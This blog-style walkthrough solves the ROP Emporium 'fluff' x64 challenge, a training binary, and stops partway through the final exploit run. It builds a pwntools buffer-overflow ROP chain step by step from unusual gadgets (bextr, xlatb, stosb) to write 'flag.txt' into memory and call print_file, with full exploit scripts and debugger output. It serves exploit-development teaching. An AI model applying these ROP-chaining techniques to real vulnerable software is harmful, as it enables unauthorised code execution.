---
layout: single
title:  "ROP Emporium - Fluff (x64)"
date:   2020-10-12
excerpt: "fluff was a fundamental challenge from the rop emporium that required the pwner to write a string to an arbitrary memory address using less than ideal gadgets. Finally, the memory address we wrote to would need to be passed to a function as an argument to dump the flag's contents."
categories:
  - ctf
  - infosec
tags:
  - exploit development
  - defeating non-executable stacks
  - rop chaining
---

## Summary

fluff was a fundamental challenge from the rop emporium that required the pwner to write a string to an arbitrary memory address using less than ideal gadgets. Finally, the memory address we wrote to would need to be passed to a function as an argument to dump the flag's contents. You can read more on the challenge [here](https://ropemporium.com/challenge/fluff.html).

## Analyze the Countermeasures

Always analyze binary countermeasures because it will determine our objective for exploiting the binary and what the limitations are. For all my binary exploit development walkthroughs, I will be using [pwntools](http://docs.pwntools.com/en/stable/) which when installed comes with `checksec`. This tool analyzes countermeasures in the binary when it was initially compiled: 

```
$ checksec fluff
[*] '/home/kali/ctf/rop-emporium/fluff/x64/fluff'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

The stack is **non-executable**, so we won't be able to redirect the program's execution to memory instructions located on the stack.
It is also notable that `RUNPATH` points to the current working directory. This is because this challenge also came with a `libfluff.so` shared object file that links to the executable upon runtime:

```
$ ldd fluff
        linux-vdso.so.1 (0x00007ffe51ff0000)
        libfluff.so => ./libfluff.so (0x00007fc27d6ad000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc27d4ce000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fc27d8b1000)
```

## The Challenge Layout

This challenge came with a shared object file `libwrite4.so` which is linked at runtime:

```
flag.txt  fluff  libfluff.so
```

### Goals

1. Write "flag.txt" to a writable memory address.
2. Invoke `print_file(flag_txt_memory_address)`.

## Satisfying the Criteria

This challenge will only be exploitable if we can satisfy a few conditions.

First, we need a writable memory segment in `fluff`:

```
[0x00400628]> iS
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ----
1   0x00000238   0x1c 0x00400238   0x1c -r-- .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- .note.ABI_tag
3   0x00000274   0x24 0x00400274   0x24 -r-- .note.gnu.build_id
4   0x00000298   0x38 0x00400298   0x38 -r-- .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- .dynsym
6   0x000003c0   0x7e 0x004003c0   0x7e -r-- .dynstr
7   0x0000043e   0x14 0x0040043e   0x14 -r-- .gnu.version
8   0x00000458   0x20 0x00400458   0x20 -r-- .gnu.version_r
9   0x00000478   0x30 0x00400478   0x30 -r-- .rela.dyn
10  0x000004a8   0x30 0x004004a8   0x30 -r-- .rela.plt
11  0x000004d8   0x17 0x004004d8   0x17 -r-x .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x .plt
13  0x00000520  0x192 0x00400520  0x192 -r-x .text
14  0x000006b4    0x9 0x004006b4    0x9 -r-x .fini
15  0x000006c0   0x10 0x004006c0   0x10 -r-- .rodata
16  0x000006d0   0x44 0x004006d0   0x44 -r-- .eh_frame_hdr
17  0x00000718  0x120 0x00400718  0x120 -r-- .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
25  0x00001038   0x29 0x00000000   0x29 ---- .comment
26  0x00001068  0x618 0x00000000  0x618 ---- .symtab
27  0x00001680  0x1f8 0x00000000  0x1f8 ---- .strtab
28  0x00001878  0x103 0x00000000  0x103 ---- .shstrtab
```

The `.data` section is normally a safe place to write to and has `0x10` bytes of space available.
On this note, we should be able to write `flag.txt` to memory address `0x00601028`.

Next, we need to write arbitrary data to the `.data` segment.

Let's search for interesting symbols in `fluff`:

```
[0x00400628]> is
[Symbols]

nth paddr       vaddr      bind   type   size lib name
――――――――――――――――――――――――――――――――――――――――――――――――――――――
... CONTENT SNIPPED ...
37   0x00000628 0x00400628 LOCAL  NOTYPE 0        questionableGadgets
... CONTENT SNIPPED ...
```

We can disassemble some instructions at `questionableGadgets`:

```
[0x00400520]> s 0x00400628
[0x00400628]> pd 16
            ;-- questionableGadgets:
            0x00400628      d7             xlatb
            0x00400629      c3             ret
            0x0040062a      5a             pop rdx
            0x0040062b      59             pop rcx
            0x0040062c      4881c1f23e00.  add rcx, 0x3ef2
            0x00400633      c4e2e8f7d9     bextr rbx, rcx, rdx
            0x00400638      c3             ret
            0x00400639      aa             stosb byte [rdi], al
            0x0040063a      c3             ret
            0x0040063b      0f1f440000     nop dword [rax + rax]
... CONTENT SNIPPED ...
```

## Working with Less-Than Ideal Gadgets

If you have done the previous challenges from the Rop Emporium, you may find these gadgets less than ideal. Let's analyze these gadgets and see if they are feasible for crafing a reliable exploit.

`stosb byte [rdi], al` ->  Writes data to the memory address pointed to by RDI.
Keep in mind that this instruction will also increment the value of RDI!

`xlatb` -> sets the `al` register to  the memory at `[rbx + al]`. You can read more on that instruction [here](https://www.felixcloutier.com/x86/xlat:xlatb).
 Note that If we plan on controlling the value of `AL`, then we also need to control the value of the `RBX` register.

`bextr rbx, rcx, rdx` -> extracts contiguous bits from `RCX` using an index value and length specified by `RDX`. Bits 7:0 in `RDX` specifies the starting bit position of bit extraction. Bits 15:8 in `RDX` specifies the maximum number of bits (LENGTH) beginning at the START position to extract. The extracted bits are written to `RBX` starting from the least significant bit. You can read more on that instruction [here](https://www.felixcloutier.com/x86/bextr).

We can control the values in the `RDX` and `RCX` registers with the ROP gadget at `0x0040062a`. Keep in mind, if we want to control the true value of the `RCX` register, we will also need to subtract `0x3ef2`.

Next, we need a way to set the RDI register:

```
[0x00400628]> /R pop rdi
  0x004006a3                 5f  pop rdi
  0x004006a4                 c3  ret
```

We have a gadget at `0x004006a3`!

## Crafting the Exploit - Controlling RBX

Now that we have analyzed the gadgets, we know that this binary is exploitable. After carefully analyzing and understanding each gadget under the `questionableGadgets` symbol, we should start developing our exploit with a bottom-up approach. First, we need a way to control the `EBX` register. Let's see if we can set `EBX` to `0xdeadbeefdeadbeef` with the exploit code below.

Note that I've kept all the memory addresses to the questionable gadgets handy for later.

```python
import ctypes
from pwn import *

def prepare_rbx(target, rop):
    # Constants
    pop_rdx_pop_rcx_add_rcx_bextr_ret_gadget = p64(0x0040062a) # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
    magic_const = 0x3ef2
    
    # ROP Chaining
    rop.raw(pop_rdx_pop_rcx_add_rcx_bextr_ret_gadget)
    rop.raw(p64(0x4000)) # Extract 64 bits from offset 0 in RCX. Results will be written to RBX.
    rop.raw(p64(ctypes.c_ulong(target - magic_const).value))

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './fluff'
io = process(PROCESS)

# Debugging
gdbscript = "b *0x0040062a"
pid = gdb.attach(io, gdbscript=gdbscript)

# Gadgets
rop = ROP(io.elf)
writable_data_segment = 0x00601028
stosb_gadget = p64(0x00400639)                                  # stosb byte [rdi], al; ret;
xlat_ret_gadget = p64(0x00400628)                               # xlatb; ret;
pop_rdi_ret = p64(0x004006a3)                                   # pop rdi; ret;

# Prepare the RBX register
target = 0xdeadbeefdeadbeef
prepare_rbx(target, rop)

# Build the payload
offset = 40
padding = b"A" * offset
payload = b"".join([
    padding,
    rop.chain()
])

# Pwn!
io.clean()
io.sendline(payload)
io.interactive()
```

```
$ python3 exploit.py
[+] Starting local process './fluff' argv=[b'./fluff'] : pid 7087
[DEBUG] Wrote gdb script to '/tmp/pwnf6cppg2c.gdb'
    b *0x0040062a
[*] running in new terminal: /usr/bin/gdb -q  "./fluff" 7087 -x /tmp/pwnf6cppg2c.gdb
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./fluff" 7087 -x /tmp/pwnf6cppg2c.gdb']
[+] Waiting for debugger: Done
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[*] '/home/kali/ctf/rop-emporium/fluff/x64/fluff'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 13 cached gadgets for './fluff'
[DEBUG] Received 0x68 bytes:
    b'fluff by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'You know changing these strings means I have to rewrite my solutions...\n'
    b'> '
[DEBUG] Sent 0x41 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  2a 06 40 00  00 00 00 00  │AAAA│AAAA│*·@·│····│
    00000030  00 40 00 00  00 00 00 00  fd 7f ad de  ef be ad de  │·@··│····│····│····│
    00000040  0a                                                  │·│
    00000041
[*] Switching to interactive mode
[DEBUG] Received 0xb bytes:
    b'Thank you!\n'
Thank you!
```

Let's see if we managed to set `RBX` to `0xdeadbeefdeadbeef` in GDB:

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb               
$rbx   : 0xdeadbeefdeadbeef
$rcx   : 0xdeadbeefdeadbeef
$rdx   : 0x4000            
$rsp   : 0x00007ffc7de4f900  →  0x00007ffc7de4f90a  →  0x0607000000010000
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007fcc7383b723  →  0x83d670000000000a
$rdi   : 0x00007fcc7383d670  →  0x0000000000000000
$rip   : 0x0000000000400638  →  <questionableGadgets+16> ret 
$r8    : 0xb               
$r9    : 0x2               
$r10   : 0xfffffffffffff52d
$r11   : 0x246             
$r12   : 0x0000000000400520  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffc7de4f900│+0x0000: 0x00007ffc7de4f90a  →  0x0607000000010000    ← $rsp
0x00007ffc7de4f908│+0x0008: 0x0000000100000000
0x00007ffc7de4f910│+0x0010: 0x0000000000400607  →  <main+0> push rbp
0x00007ffc7de4f918│+0x0018: 0x00007fcc736a27d9  →  <init_cacheinfo+297> mov rbp, rax
0x00007ffc7de4f920│+0x0020: 0x0000000000000000
0x00007ffc7de4f928│+0x0028: 0xcda5ee4fa35b68fe
0x00007ffc7de4f930│+0x0030: 0x0000000000400520  →  <_start+0> xor ebp, ebp
0x00007ffc7de4f938│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40062b <questionableGadgets+3> pop    rcx
     0x40062c <questionableGadgets+4> add    rcx, 0x3ef2
     0x400633 <questionableGadgets+11> bextr  rbx, rcx, rdx
 →   0x400638 <questionableGadgets+16> ret    
   ↳  0x7ffc7de4f90a                  add    BYTE PTR [rax], al
      0x7ffc7de4f90c                  add    DWORD PTR [rax], eax
      0x7ffc7de4f90e                  add    BYTE PTR [rax], al
      0x7ffc7de4f910                  (bad)  
      0x7ffc7de4f911                  (bad)  
      0x7ffc7de4f912                  add    BYTE PTR [rax], al
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "fluff", stopped 0x400638 in questionableGadgets (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400638 → questionableGadgets()
[#1] 0x7ffc7de4f90a → add BYTE PTR [rax], al
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p/x $rbx
$1 = 0xdeadbeefdeadbeef
```

Success! We have successfully written `0xdeadbeefdeadbeef` to the `RBX` register!

## Crafting the Exploit - Controlling AL

The `xlatb` instruction is equivalent to the following:

```
AL = [RBX + unsigned AL]
```

Therefore, we should set RBX to the following:

```
Memory address pointing to the character we want - unsigned AL
```

Since we ultimately want to write `flag.txt`, we will be able to predict what the values of AL should be.
In short, the first time we execute `xlab`, `AL` will be `f` in ascii. The second time it executes, AL will be `l` in ascii, and so on.

We can find addresses in memory that point to the bytes of our choice with `pwntools` `elf.search()` which simplifies the code when dynamically searching for specific byte patterns.

The code below builds upon the way we control the `RBX` register, allowing us to immediately control the `AL` register with a single function call.
Keep in mind, this requires that we have knowledge of what the `AL` register was initially before we invoke this function.
In some cases, it may be preferrable to zero out the `AL` register before this operation to make it predictable. However, for this challenge, the initial value in the `RBX` register was `0x0b`.

```python
import ctypes
from pwn import *

def prepare_rbx(target, rop):
    # Constants
    pop_rdx_pop_rcx_add_rcx_bextr_ret_gadget = p64(0x0040062a)      # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
    magic_const = 0x3ef2

    # ROP Chaining
    rop.raw(pop_rdx_pop_rcx_add_rcx_bextr_ret_gadget)
    rop.raw(p64(0x4000)) # Extract 64 bits from offset 0 in RCX. Results will be written to RBX.
    rop.raw(p64(ctypes.c_ulong(target - magic_const).value))

def prepare_al(target, current_al, rop, elf):
    xlat_ret_gadget = p64(0x00400628)                               # xlatb; ret;
    target_byte_addr = next(elf.search(target))
    rbx = ctypes.c_ulong(target_byte_addr - current_al).value
    prepare_rbx(rbx, rop)
    rop.raw(xlat_ret_gadget)

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './fluff'
io = process(PROCESS)

# Debugging
gdbscript = "b *0x0040062a"
pid = gdb.attach(io, gdbscript=gdbscript)

# Gadgets
rop = ROP(io.elf)
writable_data_segment = 0x00601028
stosb_gadget = p64(0x00400639)                                  # stosb byte [rdi], al; ret;
pop_rdi_ret = p64(0x004006a3)                                   # pop rdi; ret;

# Build the ROP chain

# Prepare the AL register
target = b"f"
initial_al = 0x0b
prepare_al(target, initial_al, rop, io.elf)

# Build the payload
offset = 40
padding = b"A" * offset
payload = b"".join([
    padding,
    rop.chain()
])

# Pwn!
io.clean()
io.sendline(payload)
io.interactive()
```

```
$ python3 exploit.py
[+] Starting local process './fluff' argv=[b'./fluff'] : pid 7264
[DEBUG] Wrote gdb script to '/tmp/pwn1f_ru1mm.gdb'
    b *0x0040062a
[*] running in new terminal: /usr/bin/gdb -q  "./fluff" 7264 -x /tmp/pwn1f_ru1mm.gdb
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./fluff" 7264 -x /tmp/pwn1f_ru1mm.gdb']
[+] Waiting for debugger: Done
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[*] '/home/kali/ctf/rop-emporium/fluff/x64/fluff'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 13 cached gadgets for './fluff'
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[DEBUG] Received 0x68 bytes:
    b'fluff by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'You know changing these strings means I have to rewrite my solutions...\n'
    b'> '
[DEBUG] Sent 0x49 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  2a 06 40 00  00 00 00 00  │AAAA│AAAA│*·@·│····│
    00000030  00 40 00 00  00 00 00 00  c7 c4 3f 00  00 00 00 00  │·@··│····│··?·│····│
    00000040  28 06 40 00  00 00 00 00  0a                        │(·@·│····│·│
    00000049
[*] Switching to interactive mode
[DEBUG] Received 0xb bytes:
    b'Thank you!\n'
Thank you!
```

Let's verify that we changed the value of the AL register to `f` after executing the `xlat` instruction in GDB:

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x66              
$rbx   : 0x00000000004003b9  →   add BYTE PTR [rax], al
$rcx   : 0x00000000004003b9  →   add BYTE PTR [rax], al
$rdx   : 0x4000            
$rsp   : 0x00007ffd7ab0ea28  →  0x000000010000000a
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007fd0a11e3723  →  0x1e5670000000000a
$rdi   : 0x00007fd0a11e5670  →  0x0000000000000000
$rip   : 0x0000000000400629  →  <questionableGadgets+1> ret 
$r8    : 0xb               
$r9    : 0x2               
$r10   : 0xfffffffffffff52d
$r11   : 0x246             
$r12   : 0x0000000000400520  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd7ab0ea28│+0x0000: 0x000000010000000a   ← $rsp
0x00007ffd7ab0ea30│+0x0008: 0x0000000000400607  →  <main+0> push rbp
0x00007ffd7ab0ea38│+0x0010: 0x00007fd0a104a7d9  →  <init_cacheinfo+297> mov rbp, rax
0x00007ffd7ab0ea40│+0x0018: 0x0000000000000000
0x00007ffd7ab0ea48│+0x0020: 0x6bfaf368edcc4660
0x00007ffd7ab0ea50│+0x0028: 0x0000000000400520  →  <_start+0> xor ebp, ebp
0x00007ffd7ab0ea58│+0x0030: 0x0000000000000000
0x00007ffd7ab0ea60│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400626 <usefulFunction+15> pop    rbp
     0x400627 <usefulFunction+16> ret    
     0x400628 <questionableGadgets+0> xlat   BYTE PTR ds:[rbx]
 →   0x400629 <questionableGadgets+1> ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "fluff", stopped 0x400629 in questionableGadgets (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400629 → questionableGadgets()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p/c $al
$1 = 0x66
```

If we convert `0x66` to ascii, we can verify that we set the `AL` register to `f`:

```
$ python3
Python 3.8.5 (default, Aug  2 2020, 15:09:07)
[GCC 10.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> chr(0x66)
'f'
>>>
```

## Crafting the Exploit - Writing to the .data segment (RDI)

Now we just need to write the value in `AL` to the memory address pointed to by `RDI` enough times to write `flag.txt`.

Let's update the code to look like the following:

```python
import ctypes
from pwn import *

def prepare_rbx(target, rop):
    pop_rdx_pop_rcx_add_rcx_bextr_ret_gadget = p64(0x0040062a)      # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
    rop.raw(pop_rdx_pop_rcx_add_rcx_bextr_ret_gadget)
    rop.raw(p64(0x4000)) # Extract 64 bits from offset 0 in RCX. Results will be written to RBX.
    rop.raw(p64(ctypes.c_ulong(target - magic_const).value))

def prepare_al(target, current_al, rop, elf):
    '''
    return: The current value in the AL register
    '''
    xlat_ret_gadget = p64(0x00400628)                               # xlatb; ret;
    target_byte_addr = next(elf.search(target))
    rbx = ctypes.c_ulong(target_byte_addr - current_al).value
    prepare_rbx(rbx, rop)
    rop.raw(xlat_ret_gadget)
    return target

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './fluff'
io = process(PROCESS)

# Debugging
gdbscript = "b *0x00400639"
pid = gdb.attach(io, gdbscript=gdbscript)

# Gadgets
rop = ROP(io.elf)
writable_data_segment = p64(0x00601028)
stosb_gadget = p64(0x00400639)                                  # stosb byte [rdi], al; ret;
pop_rdi_ret = p64(0x004006a3)                                   # pop rdi; ret;
magic_const = 0x3ef2

# Build the ROP chain

# Point RDI to the writeable data segment
rop.raw(pop_rdi_ret)
rop.raw(writable_data_segment)

# Prepare the AL register
target = b"f"
initial_al = 0x0b
prepare_al(target, initial_al, rop, io.elf)

# Write the byte from the AL register to the writable data segment
rop.raw(stosb_gadget)

# Build the payload
offset = 40
padding = b"A" * offset
payload = b"".join([
    padding,
    rop.chain()
])

# Pwn!
io.clean()
io.sendline(payload)
io.interactive()
```

The code above points the `RDI` register to the writable `.data` segment so that the `stosb` operation will write the byte from `AL` to the memory address pointed to by `RDI`.

```
$ python3 exploit.py
[+] Starting local process './fluff' argv=[b'./fluff'] : pid 7489
[DEBUG] Wrote gdb script to '/tmp/pwni80v1zv8.gdb'
    b *0x00400639
[*] running in new terminal: /usr/bin/gdb -q  "./fluff" 7489 -x /tmp/pwni80v1zv8.gdb
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./fluff" 7489 -x /tmp/pwni80v1zv8.gdb']
[+] Waiting for debugger: Done
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[*] '/home/kali/ctf/rop-emporium/fluff/x64/fluff'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 13 cached gadgets for './fluff'
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[DEBUG] Received 0x68 bytes:
    b'fluff by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'You know changing these strings means I have to rewrite my solutions...\n'
    b'> '
[DEBUG] Sent 0x61 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  a3 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030  28 10 60 00  00 00 00 00  2a 06 40 00  00 00 00 00  │(·`·│····│*·@·│····│
    00000040  00 40 00 00  00 00 00 00  c7 c4 3f 00  00 00 00 00  │·@··│····│··?·│····│
    00000050  28 06 40 00  00 00 00 00  39 06 40 00  00 00 00 00  │(·@·│····│9·@·│····│
    00000060  0a                                                  │·│
    00000061
[*] Switching to interactive mode
[DEBUG] Received 0xb bytes:
    b'Thank you!\n'
Thank you!
```

Let's verify that we wrote `0x66` (i.e. `f` in ascii) to the writable `.data` segment at 0x00601028:

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x66              
$rbx   : 0x00000000004003b9  →   add BYTE PTR [rax], al
$rcx   : 0x00000000004003b9  →   add BYTE PTR [rax], al
$rdx   : 0x4000            
$rsp   : 0x00007fff7c30a210  →  0x000000000000000a
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007f9415efc723  →  0xefe670000000000a
$rdi   : 0x0000000000601029  →  0x0000000000000000
$rip   : 0x000000000040063a  →  <questionableGadgets+18> ret 
$r8    : 0xb               
$r9    : 0x2               
$r10   : 0xfffffffffffff52d
$r11   : 0x246             
$r12   : 0x0000000000400520  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff7c30a210│+0x0000: 0x000000000000000a   ← $rsp
0x00007fff7c30a218│+0x0008: 0xf82ac1961fafc0a8
0x00007fff7c30a220│+0x0010: 0x0000000000400520  →  <_start+0> xor ebp, ebp
0x00007fff7c30a228│+0x0018: 0x0000000000000000
0x00007fff7c30a230│+0x0020: 0x0000000000000000
0x00007fff7c30a238│+0x0028: 0x0000000000000000
0x00007fff7c30a240│+0x0030: 0x07d4397750cfc0a8
0x00007fff7c30a248│+0x0038: 0x0702eaba6a29c0a8
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400633 <questionableGadgets+11> bextr  rbx, rcx, rdx
     0x400638 <questionableGadgets+16> ret    
     0x400639 <questionableGadgets+17> stos   BYTE PTR es:[rdi], al
 →   0x40063a <questionableGadgets+18> ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "fluff", stopped 0x40063a in questionableGadgets (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40063a → questionableGadgets()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/2xg 0x0000000000601028
0x601028:       0x0000000000000066      0x0000000000000000
```

Success! The first byte in the data segment was set to `0x66`!
One important detail to notice is that the `stosb` instruction increments `RDI`. This is convenient since we don't need to use another gadget to update `RDI` as it already points to the location in memory we want to write to.


## Crafting the Exploit - Putting it all Together

At this point, we just need to automate the steps from earlier to write whatever we want to the writable `.data` segment.
Let's update the code:

```python
import ctypes
from pwn import *

def prepare_rbx(target, rop):
    # Constants
    pop_rdx_pop_rcx_add_rcx_bextr_ret_gadget = p64(0x0040062a)      # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
    magic_const = 0x3ef2

    # ROP Chaining
    rop.raw(pop_rdx_pop_rcx_add_rcx_bextr_ret_gadget)
    rop.raw(p64(0x4000)) # Extract 64 bits from offset 0 in RCX. Results will be written to RBX.
    rop.raw(p64(ctypes.c_ulong(target - magic_const).value))

def prepare_al(target, current_al, rop, elf):
    '''
    return: The current value in the AL register
    '''
    xlat_ret_gadget = p64(0x00400628)                               # xlatb; ret;
    target_byte_addr = next(elf.search(target))
    rbx = ctypes.c_ulong(target_byte_addr - current_al).value
    prepare_rbx(rbx, rop)
    rop.raw(xlat_ret_gadget)
    return target

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './fluff'
io = process(PROCESS)

# Gadgets
rop = ROP(io.elf)
writable_data_segment = p64(0x00601028)
stosb_gadget = p64(0x00400639)                                  # stosb byte [rdi], al; ret;
pop_rdi_ret = p64(0x004006a3)                                   # pop rdi; ret;
print_file = p64(io.elf.plt['print_file'])

# Build the ROP chain

# Point RDI to the writeable data segment
rop.raw(pop_rdi_ret)
rop.raw(writable_data_segment)

# Write the target to the writable data segment
target = b"flag.txt" # The target we want to write to memory
previous_al = 0x0b   # The initial value in the AL register before exploitation
for b in target:
    # Prepare the AL register
    previous_al = prepare_al(b, previous_al, rop, io.elf)

    # Write the byte from the AL register to the writable data segment
    rop.raw(stosb_gadget)

# Point RDI to the writeable data segment that holds the target data. This is important because the stosb instruction mutated it.
rop.raw(pop_rdi_ret)
rop.raw(writable_data_segment)

# Dump the flag
rop.raw(print_file)

# Build the payload
offset = 40
padding = b"A" * offset
payload = b"".join([
    padding,
    rop.chain()
])

# Pwn!
io.clean()
io.sendline(payload)
io.interactive()
```

The new `prepare_al` function returns what it set `AL` to. This is parameter is required if we wish to run the function again.
Then, we iterate though the target string `flag.txt` so that we can write one byte at a time to the writable data segment.
Finally, we point `RDI` to `flag.txt` and invoke `print_file` to dump its contents.

```
$ python3 exploit.py
[+] Starting local process './fluff' argv=[b'./fluff'] : pid 7582
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[*] '/home/kali/ctf/rop-emporium/fluff/x64/fluff'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 13 cached gadgets for './fluff'
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[DEBUG] Received 0x68 bytes:
    b'fluff by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'You know changing these strings means I have to rewrite my solutions...\n'
    b'> '
[DEBUG] Sent 0x191 bytes:
